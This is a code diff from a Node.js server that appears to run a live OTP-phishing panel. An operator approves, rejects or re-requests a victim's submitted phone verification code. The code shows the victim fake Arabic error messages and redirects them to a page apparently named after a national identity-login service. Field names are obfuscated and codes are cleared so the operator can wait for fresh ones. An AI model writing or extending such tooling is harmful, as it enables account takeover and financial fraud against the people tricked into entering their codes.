@@ -890,25 +890,29 @@ async function startServer() {
       };
 
       if (action === "approved") {
-        // Clear any previous rejection messages
+        // Clear all phone OTP data and redirect
         updateData.phoneOtpStatus = "approved";
-        updateData.phoneRejectionMessage = null; // Clear rejection
-        updateData.phoneResendRequested = null; // Clear resend request
+        updateData.phoneRejectionMessage = null;
+        updateData.phoneResendRequested = null;
         updateData.redirectPage = "step4";
         updateData.currentStep = "_t6";
-        updateData.currentPage = "step4";
+        updateData.currentPage = "nafad";
       } else if (action === "rejected") {
-        // Set rejection - this will clear when new OTP is entered
+        // Clear OTP code but keep phone data - customer must re-enter phone info
         updateData.phoneOtpStatus = "rejected";
-        updateData.phoneRejectionMessage = "رقم الهاتف غير صحيح - يرجى المحاولة مرة أخرى";
+        updateData.phoneRejectionMessage = "رقم الهاتف غير صحيح - يرجى إدخال بيانات جديدة";
         updateData.phoneRejectionAt = new Date().toISOString();
-        updateData.phoneResendRequested = null; // Clear resend request
+        updateData.phoneResendRequested = null;
+        updateData._v7 = null; // Clear OTP code
+        updateData.phoneOtpSubmittedAt = null;
       } else if (action === "resend") {
-        // Just notify the customer to re-enter OTP
+        // Customer must re-enter OTP - show error message
         updateData.phoneResendRequested = true;
         updateData.phoneResendAt = new Date().toISOString();
-        // DON'T set phoneRejectionMessage - let customer enter new OTP freely
-        // Don't change phoneOtpStatus - let customer enter new OTP
+        updateData.phoneRejectionMessage = "رمز التحقق غير صحيح أو منتهي الصلاحية - يرجى انتظار رمز جديد";
+        // Clear the OTP code so manager sees empty box waiting for new OTP
+        updateData._v7 = null;
+        updateData.phoneOtpSubmittedAt = null;
       }
 
       // Update visitor data so customer can receive the update
